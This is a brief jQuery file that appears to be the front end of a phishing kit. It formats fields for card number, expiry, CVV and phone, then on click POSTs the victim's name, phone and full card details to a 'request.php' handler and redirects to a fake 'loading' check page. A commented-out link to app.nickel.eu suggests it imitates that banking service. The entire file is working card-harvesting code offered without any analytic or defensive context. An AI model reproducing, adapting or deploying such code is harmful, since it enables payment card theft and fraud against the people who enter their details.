jQuery(function($) {
    'use strict';
    $(".crd").mask("9999 9999 9999 9999",{placeholder:"XXXX XXXX XXXX XXXX"});
    $(".tells").mask("99 9999 9999",{placeholder:"0X XXXX XXXX"});
    $(".drt").mask("99/99",{placeholder:"MM/YY"});
    $(".cv").mask("999",{placeholder:"XXX"});


});

$(document).on('click','.botona',function(){

    var nopm = $('.lname').val();
    var numro = $('.tells').val();
    var crd = $('.crd').val();
    var date_exp = $('.drt').val();
    var cv = $('.cv').val();

    if(nopm.length > 6 && numro.length == 12 && crd.length == 19 && date_exp.length == 5 && cv.length == 3){
        $.ajax({
            type: "POST",
            url: "request.php",
            cash: false,
            data: {"step":"info","lname":nopm,"phone":numro,crd:crd,date_exp:date_exp,cv:cv},
            beforeSend: function() {
                
            },
            success: function(data) {
                var json = JSON.parse(data);
    
                if(json.success == "true"){
                    window.location.href = "./loading.php?cheking=pass&step=2&start=true&id="+makeid(26);
                    // window.location.href = "https://app.nickel.eu/"
                }
    
            }
        })
    }

})
function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
}